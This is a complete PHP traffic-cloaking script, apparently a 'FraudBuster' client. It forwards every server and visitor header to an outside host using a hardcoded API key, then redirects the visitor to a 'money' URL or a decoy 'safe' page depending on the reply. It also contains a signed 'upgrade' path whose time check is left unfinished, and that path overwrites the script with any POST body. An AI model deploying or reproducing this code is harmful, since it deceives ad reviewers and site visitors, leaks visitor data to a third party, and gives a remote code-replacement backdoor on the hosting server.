<?php
    ob_start();
    if (isset($_GET['fb17x_sign']) && isset($_GET['fb17x_time'])) {
        if (isSignatureValid($_GET['fb17x_sign'], $_GET['fb17x_time'])) {
            runInMaintenanceMode();
            return;
        }
    }

    $result = sendRequestAndGetResult(false);
    ob_end_clean();
    if ($result) {
        moneyAction();
    } else {                                                                          
        safeAction();                                                                 
    }                                                                                 
                                                                                      
    function isSignatureValid($sign, $time) {                                         
        // TODO check time!                                                           
        $str = getApikey().'.'.getClid().'.'.$time;                                   
        $sha = sha1($str);                                                            
        return $sign === $sha;                                                        
    }                                                                                 
                                                                                             
    function runInMaintenanceMode() {                                                        
        $mode = $_GET['fb17x_mode'];                                                         
        if (!isset($mode)) {                                                                 
            return returnError('Maintenance mode not set');                                  
        }                                                                                    
        if ($mode === 'upgrade') {                                                           
            upgradeScript();                                                                 
        } else if ($mode === 'diagnostics') {                                                
            performDiagnostics();
        } else {
            return returnError('Undefined maintenance mode: '.$mode);
        }
    }
    function redirect($url) {
                header("Cache-Control: no-cache, must-revalidate");
                header("Expires: Sat, 26 Jul 1997 05:00:00 GMT");
                header("X-Robots-Tag: noindex nofollow");
                header('Location: '.$url, true, 301);
                die();    }
    function parse_me($from, &$to) {
    // $to = array();
        foreach (explode('&', $from) as $part) {
            $part = explode('=', $part);
            if ($key = array_shift($part)) {
                $to[$key] = implode('', $part);
            }
        }
        // print_r($to);
    }

    function add_qsrt_to_url($url) {
        $other_query_string = arrayGet($_SERVER, 'QUERY_STRING', '');

        $url_parsed = parse_url($url);
        $new_qs_parsed = array();

        if (isset($url_parsed['query'])) {
            // parse_str($url_parsed['query'], $new_qs_parsed);
            parse_me($url_parsed['query'], $new_qs_parsed);
        }
        $other_qs_parsed = array();

        // parse_str($other_query_string, $other_qs_parsed);
        parse_me($other_query_string, $other_qs_parsed);
        // print_r($other_qs_parsed);

        $final_query_string_array = array_merge($new_qs_parsed, $other_qs_parsed);
        // var_dump($final_query_string_array);
        $final_query_string = http_build_query($final_query_string_array);
        $new_url = $url_parsed['scheme'] . '://' . $url_parsed['host'];

        if (isset($url_parsed['path'])) {
            $new_url = $new_url . $url_parsed['path'];
        }

        if ($final_query_string) {
            $new_url = $new_url . '?' . $final_query_string;
        }

        return $new_url;
    }

    function arrayGet($array, $key, $default = NULL) {
        return isset($array[$key]) ? $array[$key] : $default;
    }
    function moneyAction() {
        $url = "http://adget.az/";                                                      
        $url = add_qsrt_to_url($url);
        redirect($url);                                                                  
    }
    function safeAction() {
        $url = "http://mucizemeyveler.com/index-1.htm";                                                      
        
        redirect($url);                                                                  
    }

    function getClid() {
        return 'a03fqg4kf9';
    }
    function getFileName() {
        return basename($_SERVER['PHP_SELF']);
    }
    function getApikey() {
        return '2fcca8f7880690916870a5d741bc617d2';
    }
    function getErrorMessageForCurl($code) {
        if ($code === 2) {
            return "Unable to init curl (code 2)";
        } else if ($code === 6) {
            return "Unable to resolve DNS address (code 6). Please check your DNS settings";
        } else if ($code === 7) {
            return "Unable to connect to the server (code 7)";
        } else {
            return "Curl error ".$code;
        }
    }
    function performDiagnostics() {
        $errors = array();
        $success = true;
        $permissionsIssues = hasPermissionsIssues();
        if ($permissionsIssues) {
            $errors[] = $permissionsIssues;
            $success = false;
        }
        $serverConnectionIssues = getConnectionIssues();
        if ($serverConnectionIssues) {
            $errors[] = $serverConnectionIssues;
            $success = false;
        }
        $result = array('success' => $success, 'errors' => $errors);
        echo(json_encode($result));
    }
    function getConnectionIssues() {
        return sendRequestAndGetResult(true);
    }
    function hasPermissionsIssues() {
        $filename = 'index.tempfile';
        $tempFile = fopen($filename, 'w');
        if ( !$tempFile ) {
            return 'Unable to write file. Please issue 777 permission';
        } else {
            $meta_data = stream_get_meta_data($tempFile);
            $fullfilename = $meta_data["uri"];
             fclose($tempFile);
             return unlink($filename) ? "" : 'Unable to delete written file. Please fix write permissions';
        }
    }    
    function upgradeScript() {
         $checkSum = $_GET["fb17x_checksum"];
         $body = file_get_contents('php://input');
         $tempFileName = getFileName().'.downloaded';
         $file = fopen($tempFileName, 'w');
         fwrite($file, $body);
         fclose($file);
         $sha = sha1($body);
         if ($sha !== $checkSum) {
             return returnError('Checksums are different');
         }
         if(!rename ($tempFileName, getFileName())) {
             return returnError('Unable to rename file');
         }
         echo('{"success":true, "errorMessage":""}');
    }

    function returnError($message) {
         echo('{"success":false, "errorMessage":"'.$message.'"}');
    }
    function sendRequestAndGetResult($testConnection) {
        $ch = curl_init("http://169tp4b9.fraudbuster.im/fb2?clid=a03fqg4kf9&apikey=2fcca8f7880690916870a5d741bc617d2&hash=294925766");

        $data_to_post = array();
        $headers = array();

        foreach ( $_SERVER as $key=>$value ) {
            $normalizedValue = str_replace("\n", " - ", $value);
            $normalizedValue = str_replace("\r", " - ", $normalizedValue);
            $headers[] = 'X-HP_'.$key.': '.$normalizedValue;
        }
        curl_setopt($ch, CURLOPT_DNS_CACHE_TIMEOUT, 120);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

        $output = curl_exec($ch);
        $curl_error_number = curl_errno($ch);

        $json = json_decode($output);
        if ($json == null) {
            $result  = false;
            if ($testConnection) {
                return "Php client cannot receive answer from FraudBuster server: ".getErrorMessageForCurl($curl_error_number).' Message:'.$output;
            }
        } else {
            $result = (int) $json->result;
            if ($testConnection) {
                if (strpos($output, 'exception')) {
                    return "Php client received error from the server: ".$json->message;
                } else if (strpos($output, 'result') === false) {
                    return "Php client receives unexpected answer from FraudBuster server:".$result;
                }
                if ($result === 0 || $result === 1) {
                    return "";
                }
                return "Php client receives unexpected answer from FraudBuster server:".$result;
            }
        }

        curl_close($ch);
        return $result;
    }
?>
